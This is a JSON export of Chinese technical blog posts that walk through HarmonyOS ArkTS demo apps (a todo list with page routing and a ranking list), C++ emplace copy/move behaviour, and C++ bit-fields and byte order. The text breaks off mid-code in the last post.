[{"content":" 和 note1 一样，还是对着Demo自己敲一遍代码；不过考虑到TodoList太简单（相比于第一个Demo），决定结合后面章节的 router 相关知识点，做一点个性化的扩展。\n1 准备 有了 note1 对ArkTs的细致剖析，实际上这个 todolist 的Demo难度远小于第一个Demo。\n下载项目源码，完成若干文件的拷贝：\nsrc/main/ets/viewmodel ——数据源，没有改动的空间\nsrc/main/ets/common ——一些常量定义，没有改动的空间\nsrc/main/resources/base ——资源文件，重要，有改动空间但没必要改动……（比如想给自己的待办项换个图标）\n2 TodoItem 照着Demo实现待办项即可：\nimport CommonConstants from \u0026#39;../common/constant/CommonConstant\u0026#39; @Component export default struct TodoItem { private content?: string @State done: boolean = false; @Builder labelIcon(icon: Resource) { Image(icon) .objectFit(ImageFit.Contain) .width($r(\u0026#39;app.float.checkbox_width\u0026#39;)) .height($r(\u0026#39;app.float.checkbox_width\u0026#39;)) .margin($r(\u0026#39;app.float.checkbox_margin\u0026#39;)) } build() { Row() { if (this.done) { this.labelIcon($r(\u0026#39;app.media.ic_ok\u0026#39;)) } else { this.labelIcon($r(\u0026#39;app.media.ic_default\u0026#39;)) } Text(this.content) // ===== snip ===== } // ===== snip ===== .onClick(() =\u0026gt; { this.done = !this.done }) } } 关键部分只是一个条件渲染，用于在不同的完成状态选择不同的图标，这个在 note 1 已经接触过了。\n3 完成所有任务时使用Router 根据官网教程顺序，TodoList后面就是应用程序框架 UIAbility ，有个页面跳转的 Demo ，令我萌生想把TodoList跟这个Demo结合起来的想法。\n容易想到，对于待办列表这个页面来说，当所有任务完成时，跳转到一个祝贺页面，是常见、简单且合理的场景。\n于是做如下实现。\n3.1 未完成项数统计 要在所有任务完成时进行页面跳转，首先应能够统计未完成的项数。\n这里就适合使用 @Link 装饰器，将父子元素双向绑定，父元素（即总页面）提供总的待办任务数，每个子元素（ TodoItem ）在被点为完成时将此未完成项数减一。\nTalk is Cheap：\n@Component export default struct TodoItem { private content?: string @State done: boolean = false; @Link unfinishedTasks: number; build() { Row() { // ===== snip ===== .onClick(() =\u0026gt; { this.done = !this.done if (this.done) { this.unfinishedTasks -= 1; } else { this.unfinishedTasks += 1; } }) } } Index页面：\n@Entry @Component struct Index { private totalTasks: Array\u0026lt;string\u0026gt; = []; @State @Watch(\u0026#39;onTaskCountChange\u0026#39;) unfinishedTasks: number = 0; @State msg: string = \u0026#39;\u0026#39;; onTaskCountChange(propName: string): void { this.msg = \u0026#34;toggle \u0026#34; + this.unfinishedTasks; if (this.unfinishedTasks === 0) { router.pushUrl({ url: \u0026#39;pages/Congrats\u0026#39;, params: { count: this.totalTasks.length } }).catch((error: Error) =\u0026gt; { this.msg = \u0026#39;error: \u0026#39; + JSON.stringify(error); }); } } aboutToAppear() { this.totalTasks = DataModel.getData(); this.unfinishedTasks = this.totalTasks.length; } build() { Column({ space: CommonConstants.COLUMN_SPACE }) { Text($r(\u0026#39;app.string.page_title\u0026#39;)) // ===== snip ===== Text(this.msg) .textAlign(TextAlign.Center) ForEach(this.totalTasks, (item: string) =\u0026gt; { TodoItem({ content: item, unfinishedTasks: $unfinishedTasks }); }, (item: string) =\u0026gt; JSON.stringify(item)) } // ===== snip ===== } } 这里关注 unfinishedTasks 这个变量，它和 @Link 的双向绑定，也是前一节中遇到过的。\n3.2 未完成项数监控 能够实时更新未完成项数之后，还有一个重要的任务就是 当这个项数减为 0 时，要进行页面跳转 ，这里，通过 @Watch('[callback]') 装饰器，实现对这个变量的动态监控。\n@State @Watch(\u0026#39;onTaskCountChange\u0026#39;) unfinishedTasks: number = 0; onTaskCountChange(propName: string): void { this.msg = \u0026#34;toggle \u0026#34; + this.unfinishedTasks; if (this.unfinishedTasks === 0) { router.pushUrl({ url: \u0026#39;pages/Congrats\u0026#39;, params: { count: this.totalTasks.length } }).catch((error: Error) =\u0026gt; { this.msg = \u0026#39;error: \u0026#39; + JSON.stringify(error); }); } } 每次这个变量发生变化时（在这里就是由子元素触发的变化），系统会调用一次回调函数，在函数中，我们判断这个变量的值是否减至 0 ，若是，执行页面跳转。\n3.3 页面跳转 页面跳转的部分，就完全是 Demo 的复刻。我们提供一个 Congrats.ets 页面，跳转时向它传递完成的任务总数，在页面中获取参数并打印出来。\n@Entry @Component struct Congrats { private count?: string = (router.getParams() as Record\u0026lt;string, string\u0026gt;)[\u0026#39;count\u0026#39;]; build() { Row() { Column() { Text(\u0026#39;Great! U have finished \u0026#39; + this.count + \u0026#34; tasks!\u0026#34;) .fontSize(\u0026#39;38fp\u0026#39;) .textAlign(TextAlign.Center) .padding({ left: 0.5 }) Blank() Button(\u0026#39;ok\u0026#39;) .fontSize(\u0026#39;16fp\u0026#39;) .width(\u0026#39;260vp\u0026#39;) .height(\u0026#39;40vp\u0026#39;) .backgroundColor(\u0026#39;#007DFF\u0026#39;) .onClick(() =\u0026gt; { router.back(); }) } .width(\u0026#39;100%\u0026#39;) .height(\u0026#39;100%\u0026#39;) } } } 4 结果 第二个页面没有样式设计，凑合看～\n","date":"2023-10-09T00:00:00Z","permalink":"https://xrg.fj.cn/p/harmonyos-learning2%E5%B8%A6%E8%B7%B3%E8%BD%AC%E7%9A%84%E5%BE%85%E5%8A%9E%E5%88%97%E8%A1%A8/","title":"【HarmonyOS learning】【2】带跳转的待办列表"},{"content":"项目源码\n1 准备 1.1 新建工程 DevEcoStudio 创建空白工程，只关注 entry/src/main 路径即可，IDE默认已创建好应用入口和入口页面，不需要其他操作，准备按照项目逻辑来创建页面。\n1.2 数据类型定义 完成工程创建后，我们再来创建一些数据类型的定义。将此动作归到 『准备』 一节，只是由于在复刻这个Demo的时候没办法对这些数据类型做什么变动，从Demo源码里复制粘贴即可。\n// src/main/ets/common/bean/RankData.ets export class RankData { name: Resource; vote: string; // Number of votes id: string; constructor(id: string, name: Resource, vote: string) { this.id = id; this.name = name; this.vote = vote; } } 这里的 RankData.name 的类型是 Resource ，这应该是SDK提供的一种现成数据类型，此处先不管，后文可以看到这个类型的用法。\n至于另一份数据类型文件 src/main/ets/common/constants/Constants.ets ，也直接从开源Demo工程拷贝即可，这文件里主要是一些常量的定义，比如页面宽度、高度、padding等。\n1.3 准备资源 应用程序的资源目录在 src/main/resources 路径下，这里直接把开源Demo的资源整个复制到我们的 Demo 里即可，这些资源包括字符定义、多媒体文件等。\n例如 src/main/resources/base/element/color.json 和 src/main/resources/base/element/string.json ，这两个文件提供的部分配置会在 Constants.ets 代码中通过 $r() 表达式取用。\n1.4 准备数据源 程序打桩了数据源，把数据写死在 src/main/ets/model/DataModel.ts 里面，并在 src/main/ets/viewmodel/RankViewModel.ets 提供了获取数据的接口。因此把这两个文件也拷贝到我们的工程中。\n2 页面组件 2.1 标题 首先实现标题栏组件。\n@Component export struct TitleComponent { @Link isRefreshData: boolean; @State title: Resource = $r(\u0026#39;app.string.title_default\u0026#39;); // ===== snip ===== } src/main/ets/view/TitleComponent.ets 文件的实现，体现了ArkTs的若干知识点：\n@Component 装饰器，表明这个类型是用户自定义的UI组件；\n@State 装饰器，表明这个数据是组件内部的状态数据，当这个状态数据被修改时，会调用 所在组件 的 build 方法进行UI刷新 1 ；\n@Link 装饰器，表明这个变量会与父组件的一个 @State 变量建立双向绑定，注意 @Link 变量 不能 在组件内部进行初始化；\n$r 表达式，从 resource 里面获取配置信息，早先也见到过了。\n继续看：\nbuild() { Row() { Row() { Image($r(\u0026#39;app.media.ic_public_back\u0026#39;)) // ===== snip ===== .onClick(() =\u0026gt; { let handler = getContext(this) as AppContext.UIAbilityContext; handler.terminateSelf(); }) Text(this.title) .fontSize(FontSize.LARGE) } // ===== snip ===== Row() { Image($r(\u0026#39;app.media.loading\u0026#39;)) // ===== snip ===== .onClick(() =\u0026gt; { this.isRefreshData = !this.isRefreshData; }) } // ===== snip ===== } // ===== snip ===== } } 标题栏的 build() 的实现，只介绍重点，代码显示整个标题栏实际上是由两个 Row 组件组成的，第一个 Row 包含返回图标和标题文字，第二个 Row 包含刷新图标；\n第一个 Image 的 onClick ，实现返回动作。\n2.2 列表头 @Component export struct ListHeaderComponent { paddingValue: Padding | Length = 0; widthValue: Length = 0; build() { Row() { Text($r(\u0026#39;app.string.page_number\u0026#39;)) // ===== snip ===== Text($r(\u0026#39;app.string.page_type\u0026#39;)) // ===== snip ===== Text($r(\u0026#39;app.string.page_vote\u0026#39;)) // ===== snip ===== } } } 这个组件其实没什么好讲，纯文本组件。\n这里的三份 Text 其实只有 width 的区别，可以考虑用 @Styles 装饰器来提取公共代码 2 。\n2.3 列表项 首先是列表项的数据类型的定义：\n@Component export struct ListItemComponent { index?: number; private name?: Resource; @Prop vote: string = \u0026#39;\u0026#39;; @Prop isSwitchDataSource: boolean = false; // The state is related to the font color of ListItemComponent. @State isChange: boolean = false; // ===== snip ===== } 这里的 ? 用于表示 可选参数 3 4 ，个人觉得这里用上这个操作，有点逆天，增加了Demo的理解难度，并且从场景上看， index 和 name 也并不是可选的；\n@Prop 装饰器，与 @State 有相同语义，但初始化方式不同。 @Prop 装饰的变量需使用父组件提供的 @State 变量进行初始化，允许组件内部修改 @Prop 变量，但更改不会通知父组件，即 @Prop 属于单向数据绑定。\n其实这里没太理解为啥要用 @Prop 而不是 @State ，大约这就是Demo吧（x\n再看列表项的 build() 实现：\nbuild() { Row() { Column() { if (this.isRenderCircleText()) { if (this.index !== undefined) { this.CircleText(this.index); } } else { Text(this.index?.toString()) // ===== snip ===== } } // ===== snip ===== Text(this.name) // ===== snip ===== Text(this.vote) // ===== snip ===== } // ===== snip ===== .onClick(() =\u0026gt; { this.isSwitchDataSource = !this.isSwitchDataSource; this.isChange = !this.isChange; }) } @Builder CircleText(index: number) { Row() { Text(this.index?.toString()) .fontWeight(FontWeight.BOLD) .fontSize(FontSize.SMALL) .fontColor(Color.White); } .justifyContent(FlexAlign.Center) .borderRadius(ItemStyle.CIRCLE_TEXT_BORDER_RADIUS) .size({ width: ItemStyle.CIRCLE_TEXT_SIZE, height: ItemStyle.CIRCLE_TEXT_SIZE }) .backgroundColor($r(\u0026#39;app.color.circle_text_background\u0026#39;)) } isRenderCircleText(): boolean { // Just render the element before the fourth in the list. return this.index === 1 || this.index === 2 || this.index === 3; } 这一段实现涉及的知识点是有点说法的：\n条件渲染 5 ，对于前三个 index 的元素做了特殊渲染处理。\n@Builder 装饰器，在一个组件内快速生成多个布局内容。由于每个组件的总入口是 build() ，为了不让 build 太冗长，允许在 build 内调用 @Builder 方法，来进一步抽取出粒度更细的自定义组件；给我的感觉就是轻量 @Component 。\nisSwitchDataSource 这里没啥用处，是个冗余成员。\n3 主页 3.1 数据加载 完成了三个组件的定义后，打开创建工程时自动生成的 src/main/ets/pages/Index.ets ，编辑主页。\n@Entry @Component struct RankPage { @State dataSource1: RankData[] = []; @State dataSource2: RankData[] = []; // The State is used to decide whether to switch the data of RankList. @State isSwitchDataSource: boolean = true; // It will record the time of clicking back button of system navigation. private clickBackTimeRecord: number = 0; aboutToAppear() { this.dataSource1 = rankModel.loadRankDataSource1(); this.dataSource2 = rankModel.loadRankDataSource2(); } // ===== snip ===== } dataSource1/2 一开始默认是空数组；在 aboutToAppear 方法里加载数据。页面生命周期及方法如下图： life cycle isSwitchDataSource ，这个是要跟标题栏里面的 @Link 成员绑定的，用于实现数据源切换； 3.2 返回确认 通过实现 onBackPress 来支持返回确认，防止用户误触返回键时应用被关闭，这段实现参考价值极大：\nonBackPress() { if (this.isShowToast()) { prompt.showToast({ message: $r(\u0026#39;app.string.prompt_text\u0026#39;), duration: TIME }); this.clickBackTimeRecord = new Date().getTime(); return true; } return false; } isShowToast(): boolean { return new Date().getTime() - this.clickBackTimeRecord \u0026gt; APP_EXIT_INTERVAL; } 这里弹窗显示时间通过 duration 指定；\nonBackPress 返回 false 的时候，系统继续执行返回动作，返回 true 时反之；\n通过内部一个成员来记录用户上次点击返回按钮的时间，以此实现「再按一次返回退出」的逻辑；\n返回按钮在某些应用（头条、B站等）上实际上是一次返回刷新、两次返回退出的逻辑，可以参考这段代码实现。\n3.3 页面构建 build() { Column() { // Title component in the top. TitleComponent({ isRefreshData: $isSwitchDataSource, title: TITLE }) // The head style of List component. ListHeaderComponent({ paddingValue: { left: Style.RANK_PADDING, right: Style.RANK_PADDING }, widthValue: Style.CONTENT_WIDTH }) .margin({ top: Style.HEADER_MARGIN_TOP, bottom: Style.HEADER_MARGIN_BOTTOM }) // The style of List component. this.RankList(Style.CONTENT_WIDTH) } // ===== snip ===== } @Builder RankList(widthValue: Length) { Column() { List() { ForEach(this.isSwitchDataSource ? this.dataSource1 : this.dataSource2, (item: RankData, index?: number) =\u0026gt; { ListItem() { ListItemComponent({ index: (Number(index) + 1), name: item.name, vote: item.vote, isSwitchDataSource: this.isSwitchDataSource }) } }, (item: RankData) =\u0026gt; JSON.stringify(item)) } // ===== snip ===== } // ===== snip ===== } 页面核心通过 @Builder RankList(widthValue: Length) 方法来构建，这里通过循环渲染 5 来创建多个 ListItemComponent 。\n4 小结 至此，ArkTs第一个demo就逐一拆解分析完毕了。\n实际上Demo的页面效果这么好，除了脚本语言外，很大一部分要归功于现成的CSS样式（第一节）。\n这里确实只是一个入门Demo，分析下来，自觉学到不少，笔记也写出不少，算是很有些内容了。\n项目源码\n参考资料 https://developer.huawei.com/consumer/cn/training/course/slightMooc/C101667356568959645?ha_linker=eyJ0cyI6MTY5NjU1MjEzNzA5MiwiaWQiOiJjZTA3YjQ0MWZkNjQ5ZjQ3ZTUwNDQ5MjY4ZjVmZTRlZSJ9\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nhttps://developer.harmonyos.com/cn/docs/documentation/doc-guides/ets-dynamic-ui-element-building-0000001366154244#ZH-CN_TOPIC_0000001366154244__styles\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nhttps://blog.51cto.com/u_15808854/5716099#\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nhttps://www.codecademy.com/courses/learn-typescript/lessons/typescript-advanced-object-types/exercises/optional-type-members#\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nhttps://developer.harmonyos.com/cn/docs/documentation/doc-guides/ets-rendering-control-0000001149698611#ZH-CN_TOPIC_0000001157228877\u0026#160;\u0026#x21a9;\u0026#xfe0e;\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","date":"2023-10-06T00:00:00Z","permalink":"https://xrg.fj.cn/p/harmonyos-learning1%E6%A1%88%E4%BE%8Barkts%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%88%86%E6%9E%90/","title":"【HarmonyOS learning】【1】「案例：ArkTS基础知识」分析"},{"content":"较新版本的cpp容器支持一些 emplace 操作，比如 vector::empalce 和 map::emplace ，其原地构造特性对于一些拷贝成本较高的对象容器来说着实吸引人。\n不过 emplace 动作有些时候会退化回拷贝，近期恰好有需求要用到拷贝成本高的对象，希望在它们的容器中善用 emplace 来节约开销，因此在业余时间浅做了一些实验，希望这些认知可以指导后续的实践。\n1 emplace左值——退化为拷贝 为了便于观察对象的移动/拷贝，简单实现一个对象（经典做法）：\nclass Obj { public: Obj() { std::cout \u0026lt;\u0026lt; \u0026#34;ctor\u0026#34; \u0026lt;\u0026lt; std::endl; } ~Obj() { std::cout \u0026lt;\u0026lt; \u0026#34;dtor\u0026#34; \u0026lt;\u0026lt; std::endl; } Obj(const Obj \u0026amp;rhs) { std::cout \u0026lt;\u0026lt; \u0026#34;copy ctor\u0026#34; \u0026lt;\u0026lt; std::endl; } Obj(Obj \u0026amp;\u0026amp;rhs) { std::cout \u0026lt;\u0026lt; \u0026#34;move ctor\u0026#34; \u0026lt;\u0026lt; std::endl; } Obj \u0026amp;operator=(const Obj \u0026amp;rhs) { std::cout \u0026lt;\u0026lt; \u0026#34;copy operator=\u0026#34; \u0026lt;\u0026lt; std::endl; return *this; } Obj \u0026amp;operator=(Obj \u0026amp;\u0026amp;rhs) { std::cout \u0026lt;\u0026lt; \u0026#34;move operator=\u0026#34; \u0026lt;\u0026lt; std::endl; return *this; } void Echo() { std::cout \u0026lt;\u0026lt; \u0026#34;Hello world\u0026#34; \u0026lt;\u0026lt; std::endl; } }; 对于通常的业务代码，容器一般是封装在某个类中的，在这里为了更加还原实际场景，简单设置一个 Shelter 类，其成员是一个 multimap ，提供一个对外的 Push 接口来往 multimap 中添加数据，然后在 Push 接口里调用 multimap::emplace 方法。\nclass Shelter { public: void Push(std::pair\u0026lt;int, Obj\u0026gt; item); void Dump(); private: std::multimap\u0026lt;int, Obj\u0026gt; mmp_; }; void Shelter::Push(std::pair\u0026lt;int, Obj\u0026gt; item) { std::cout \u0026lt;\u0026lt; \u0026#34;Shelter::Push =========\u0026gt;\u0026#34; \u0026lt;\u0026lt; std::endl; mmp_.emplace(item); } void Shelter::Dump() { for (auto \u0026amp;[k, v] : mmp_) { v.Echo(); } } 1.1 传值 上面给出的 Shelter 实现中， Push 参数按值传递。\n在 main 函数分别向 Push 接口传一个右值和一个左值：\nint main(int argc, const char * argv[]) { Shelter shelter; shelter.Push({1, Obj()}); auto input = std::make_pair(2, Obj()); shelter.Push(input); shelter.Dump(); return 0; } 观察输出：\nctor move ctor Shelter::Push =========\u0026gt; copy ctor dtor dtor ctor move ctor dtor copy ctor Shelter::Push =========\u0026gt; copy ctor dtor Hello world Hello world dtor dtor dtor 分析程序分别执行了什么动作导致这些输出的产生：\n# shelter.Push({1, Obj()}); ctor\t# 临时对象创建 move ctor\t# 临时对象移动到pair Shelter::Push =========\u0026gt; copy ctor\t# emplace，产生复制 dtor\t# Push参数对象析构 dtor\t# pair里的临时对象析构 # auto input = std::make_pair(2, Obj()); # shelter.Push(input); ctor\t# make_pair临时Obj创建 move ctor\t# 临时Obj移动到pair dtor\t# 临时Obj销毁 copy ctor\t# 值传递 Shelter::Push =========\u0026gt; copy ctor\t# emplace，复制 dtor\t# Push参数对象析构 # shelter.Dump() Hello world Hello world # 本地obj对象和shelter.mmp_里面的两个对象析构 dtor dtor dtor 可见，对于一个纯粹的左值来说， emplace 会退化成为拷贝构造，显然不太符合实际业务中原地构造、节省开销的诉求。\n1.2 传左值/右值引用 简单改写一下 Push 接口，使其可以区分右值和左值：\nvoid Shelter::Push(std::pair\u0026lt;int, Obj\u0026gt; \u0026amp;item) { std::cout \u0026lt;\u0026lt; \u0026#34;Shelter::Push lvalue ref =========\u0026gt;\u0026#34; \u0026lt;\u0026lt; std::endl; mmp_.emplace(item); } void Shelter::Push(std::pair\u0026lt;int, Obj\u0026gt; \u0026amp;\u0026amp;item) { std::cout \u0026lt;\u0026lt; \u0026#34;Shelter::Push rvalue ref =========\u0026gt;\u0026#34; \u0026lt;\u0026lt; std::endl; mmp_.emplace(item); } 输出却毫无变化：\n# 以下只关注Push内部发生的事情，外部其他构造/析构输出省略 Shelter::Push rvalue ref =========\u0026gt; copy ctor\t# emplace，还是拷贝 Shelter::Push lvalue ref =========\u0026gt; copy ctor 诶？怎么传入右值和左值，都在 emplace 的时候拷贝？注意：右值引用本身是一个左值类型，因此本质上传给 emplace 的还是一个左值，为了在 Push(Obj \u0026amp;\u0026amp;) 接口内充分利用移动语义，需要再执行一回类型转换：\nvoid Shelter::Push(std::pair\u0026lt;int, Obj\u0026gt; \u0026amp;\u0026amp;item) { std::cout \u0026lt;\u0026lt; \u0026#34;Shelter::Push rvalue ref =========\u0026gt;\u0026#34; \u0026lt;\u0026lt; std::endl; mmp_.emplace(std::move(item)); } # 调用方法仍旧如前 Shelter::Push rvalue ref =========\u0026gt; move ctor\t# 符合预期，入参是右值，移动 Shelter::Push lvalue ref =========\u0026gt; copy ctor\t# 入参是左值，拷贝 2 减少重复代码 实际上分别实现了参数类型为左值引用和右值引用的 Push 后，我们已然能够借助移动语义来提高程序性能，不过，从代码上看，却发现这两个版本大差不差，令人很想将它们合并起来。\n自动区分入参是左值还是右值，并原原本本传递给 multimap::emplace ，这听着真是一个再熟悉不过的场景了，简直是 万能引用 + 完美转发 的模板场景：\ntemplate\u0026lt;typename T\u0026gt; void Push(T \u0026amp;\u0026amp;val) { std::cout \u0026lt;\u0026lt; \u0026#34;Shelter::Push =========\u0026gt;\u0026#34; \u0026lt;\u0026lt; std::endl; mmp_.emplace(std::forward\u0026lt;T\u0026gt;(val)); } 坏处是由于模板参数没法自动推导 {xxx} 的类型，之前向接口传入右值的写法必须改写：\nshelter.Push({1, Obj()}); // 编译错误 shelter.Push(std::make_pair(1, Obj())); // fine 输出则是符合预期的：\nShelter::Push =========\u0026gt; move ctor\t# 入参是右值，传给emplace的就是右值 Shelter::Push =========\u0026gt; copy ctor\t# 入参是左值，传给emplace的就是左值 如果希望对接口的自由度进行进一步限制，也可以只允许 T 被推导为 pair\u0026lt;int, Obj\u0026gt; ：\nusing MapItem = std::pair\u0026lt;int, Obj\u0026gt;; template\u0026lt;typename T, std::enable_if_t\u0026lt;std::is_same_v\u0026lt;std::remove_reference_t\u0026lt;T\u0026gt;, MapItem\u0026gt;, int\u0026gt; = 0\u0026gt; void Push(T \u0026amp;\u0026amp;val) { std::cout \u0026lt;\u0026lt; \u0026#34;Shelter::Push =========\u0026gt;\u0026#34; \u0026lt;\u0026lt; std::endl; mmp_.emplace(std::forward\u0026lt;T\u0026gt;(val)); } ","date":"2023-09-17T00:00:00Z","permalink":"https://xrg.fj.cn/p/c-emplace%E7%9A%84%E4%BA%9B%E8%AE%B8%E7%BB%86%E8%8A%82/","title":"C++「emplace」的些许细节"},{"content":"近来修改业务代码的Codecheck，其中有几处移位运算，本来是想着屏蔽检查的，后来被组内大佬建议改用 位域 进行改写，登时觉得惭愧：我所了解的知识竟不至于修改一处小小的代码规范检查？后浅作研究，方觉得这个东西倒也不甚玄妙，此处不予置评，文末方说。\n0 何为位域 位域（ bit-field ，后文均用 bit-field ）是一种特殊的类定义写法，其显式指明了一个类成员所占用的 比特位 ，临近的 bit-field 成员因此有可能在内存上共用或横跨字节 1 。\nstruct Foo { unsigned int a; unsigned int b; }; struct Bar { // using bit field unsigned int x : 23; unsigned int y : 9; }; int main() { std::cout \u0026lt;\u0026lt; \u0026#34;sizeof Foo: \u0026#34; \u0026lt;\u0026lt; sizeof(Foo) \u0026lt;\u0026lt; std::endl \u0026lt;\u0026lt; \u0026#34;sizeof Bar: \u0026#34; \u0026lt;\u0026lt; sizeof(Bar) \u0026lt;\u0026lt; std::endl; } /** output: sizeof Foo: 8 sizeof Bar: 4 */ 我们已知 unsigned int 大小是 4 字节，则 Foo 所占用的内存结构如下：\nFoo bit-field 写法下的 Bar 所占用的内存结构如下：\nBar 可以看到，这里的 Bar::x 和 Bar::y 共用了 字节 2 ，其中 Bar::x 用了这个字节的 7 个比特位，Bar::y 用了这个字节的 1 个比特位。\n1 场景 大佬让我使用 bit-field 是因为有这么个场景，需要使用 uint64_t 来表示一个特殊的数据结构，其中高 8 位是一个计数器，用于防止数据重放；原本获取这个数值的代码是这么写的（已脱敏、简化）：\nuint64_t val = GetVal(); uint8_t e2e = GetE2e(); // counter val |= static_cast\u0026lt;uint64_t\u0026gt;(e2e) \u0026lt;\u0026lt; 56U; 这里的操作其实也没什么毛病，检出的Codecheck本身是个误报，不过，大佬看了这么段代码，觉得这个移位赋值太丑了，于是建议我改用 bit-field 来实现，我最终是这么写的：\nstruct Bar { // using bit field uint64_t val : 56; uint8_t e2e : 8; }; Bar bar {.val = GetVal(), .e2e = GetE2e()}; 看似一切都好，实则有很多东西需要考虑，且看下文分解。\n2 转换 原本使用 uint64_t 来表示这么个数据结构，目的是最终把它转为一个 vector\u0026lt;uint8_t\u0026gt; 提供出去；本地用整型维护，是因为这个数据需要频繁地加加减减，如果一开始就维护 vector ，就太难运算了。\n因此，改写为 bit-field 之后，仍然必须考虑如何将它转换为 vector\u0026lt;uint8_t\u0026gt; 。\ncppreference 提供的Demo里，有个很粗暴的动作是 std::bit_cast 2 ，这个接口会直接把变量所在的地址的一段内存转义为模板指定的那个类型，用在 bit-field 身上大致是这样的：\nstruct Bar { // using bit field uint64_t val : 56; uint8_t e2e : 8; }; int main() { uint64_t localVal = 0x00123456789ABCDEU; uint8_t localE2e = 0xF0U; Bar bar {.val = localVal, .e2e = localE2e}; std::cout \u0026lt;\u0026lt; std::setfill(\u0026#39;0\u0026#39;) \u0026lt;\u0026lt; std::setw(2) \u0026lt;\u0026lt; std::hex \u0026lt;\u0026lt; std::bit_cast\u0026lt;uint64_t\u0026gt;(bar) \u0026lt;\u0026lt; std::endl; return 0; } /** output f0123456789abcde */ 可以看到，这里的输出值实际上是符合我们的预期的，因为这个 bit-field 结构的定义就来自于业务中使用 高 8 位 代表计数器的需求，这里转化出来的 uint64_t 值中，也的确把 0xF0 的部分放到了高位字节。\n不过很可惜的是， bit_cast 是C++20以后的特性了，在当前的业务代码中无法使用，穷则思变，大不了自己做类型转换：\nstruct Bar { // using bit field uint64_t val : 56; uint8_t e2e : 8; }; int main() { uint64_t localVal = 0x00123456789ABCDEU; uint8_t localE2e = 0xF0U; Bar bar {.val = localVal, .e2e = localE2e}; std::cout \u0026lt;\u0026lt; \u0026#34;Using bit_cast: \u0026#34; \u0026lt;\u0026lt; std::setfill(\u0026#39;0\u0026#39;) \u0026lt;\u0026lt; std::setw(2) \u0026lt;\u0026lt; std::hex \u0026lt;\u0026lt; std::bit_cast\u0026lt;uint64_t\u0026gt;(bar) \u0026lt;\u0026lt; std::endl; std::cout \u0026lt;\u0026lt; \u0026#34;Using reinterpret_cast: \u0026#34; \u0026lt;\u0026lt; std::setfill(\u0026#39;0\u0026#39;) \u0026lt;\u0026lt; std::setw(2) \u0026lt;\u0026lt; std::hex \u0026lt;\u0026lt; *(reinterpret_cast\u0026lt;uint64_t*\u0026gt;(\u0026amp;bar)) \u0026lt;\u0026lt; std::endl; return 0; } /**output Using bit_cast: f0123456789abcde Using reinterpret_cast: f0123456789abcde */ 这基本就解决了一切问题，只要把 bit-field 结构转为 uint64_t 传入原有的接口即可。\n问题的确是这样解决了的，然而这个特性只这么简单么？\n3 内存结构 3.1 早出现的成员在低地址 我们将 Bar 的成员定义换一个顺序，看看输出还是否符合我们的预期：\nstruct Bar { // using bit field uint8_t e2e : 8; uint64_t val : 56; }; int main() { uint64_t localVal = 0x00123456789ABCDEU; uint8_t localE2e = 0xF0U; Bar bar {.e2e = localE2e, .val = localVal}; std::cout \u0026lt;\u0026lt; \u0026#34;Using bit_cast: \u0026#34; \u0026lt;\u0026lt; std::setfill(\u0026#39;0\u0026#39;) \u0026lt;\u0026lt; std::setw(2) \u0026lt;\u0026lt; std::hex \u0026lt;\u0026lt; std::bit_cast\u0026lt;uint64_t\u0026gt;(bar) \u0026lt;\u0026lt; std::endl; std::cout \u0026lt;\u0026lt; \u0026#34;Using reinterpret_cast: \u0026#34; \u0026lt;\u0026lt; std::setfill(\u0026#39;0\u0026#39;) \u0026lt;\u0026lt; std::setw(2) \u0026lt;\u0026lt; std::hex \u0026lt;\u0026lt; *(reinterpret_cast\u0026lt;uint64_t*\u0026gt;(\u0026amp;bar)) \u0026lt;\u0026lt; std::endl; return 0; } /**output Using bit_cast: 123456789abcdef0 Using reinterpret_cast: 123456789abcdef0 */ 我们发现，结构体中的计数器部分，转为 uint64_t 之后所在的位置，实际上是不符合预期的。这就表明：我们在定义 bit-field 的时候，越先出现的成员，实际上是在最终转出来的值的 低位 上。\n观察我们执行机的字节序 3 ：\n[drogon@VM-4-4-centos build]$ lscpu | grep -i byte Byte Order: Little Endian 结合 小端序 的定义，最终可以判断， bit-field 中先定义的成员，就位于 低地址 ，后面的成员，就位于 高地址 ；那么，一个 bit-field 会被转成什么样的数值，就是不确定的了，在小端序机器中，我们最终希望出现在高位的值，就必须放在 bit-field 的后面部分去定义，而大端序机器上，定义则必须相反。\n举另一成员较多的结构来佐证我们的发现：\nstruct Foo { uint16_t a : 16; uint16_t b : 16; uint16_t c : 16; uint16_t d : 16; }; int main() { uint16_t localA {0x1234U}; uint16_t localB {0x5678U}; uint16_t localC {0x90ABU}; uint16_t localD {0xCDEFU}; Foo foo {.a = localA, .b = localB, .c = localC, .d = localD}; std::cout \u0026lt;\u0026lt; \u0026#34;Using reinterpret_cast: \u0026#34; \u0026lt;\u0026lt; std::setfill(\u0026#39;0\u0026#39;) \u0026lt;\u0026lt; std::setw(2) \u0026lt;\u0026lt; std::hex \u0026lt;\u0026lt; *(reinterpret_cast\u0026lt;uint64_t*\u0026gt;(\u0026amp;foo)) \u0026lt;\u0026lt; std::endl; return 0; } /**output Using reinterpret_cast: cdef90ab56781234 */ 3.2 每个成员都遵循字节序 我们考虑直接把 Foo 结构所在的内存，按照从低到高的顺序，一个字节一个字节地打出来。这时早前提到的 std::vector\u0026lt;uint8_t\u0026gt; 和 memcpy 就是一个很好的帮手了：\nstruct Foo { uint16_t a : 16; uint16_t b : 16; uint16_t c : 16; uint16_t d : 16; }; int main() { uint16_t localA {0x1234U}; uint16_t localB {0x5678U}; uint16_t localC {0x90ABU}; uint16_t localD {0xCDEFU}; Foo foo {.a = localA, .b = localB, .c = localC, .d = localD}; std::cout \u0026lt;\u0026lt; \u0026#34;Using reinterpret_cast: \u0026#34; \u0026lt;\u0026lt; std::setfill(\u0026#39;0\u0026#39;) \u0026lt;\u0026lt; std::setw(2) \u0026lt;\u0026lt; std::hex \u0026lt;\u0026lt; *(reinterpret_cast\u0026lt;uint64_t*\u0026gt;(\u0026amp;foo)) \u0026lt;\u0026lt; std::endl; std::vector\u0026lt;uint8_t\u0026gt; vec(sizeof(Foo), 0x0U); memcpy(vec.data(), \u0026amp;foo, sizeof(foo)); std::cout \u0026lt;\u0026lt; \u0026#34;Using memcpy: \u0026#34;; for (auto ele : vec) { std::cout \u0026lt;\u0026lt; std::setfill(\u0026#39;0\u0026#39;) \u0026lt;\u0026lt; std::setw(2) \u0026lt;\u0026lt; 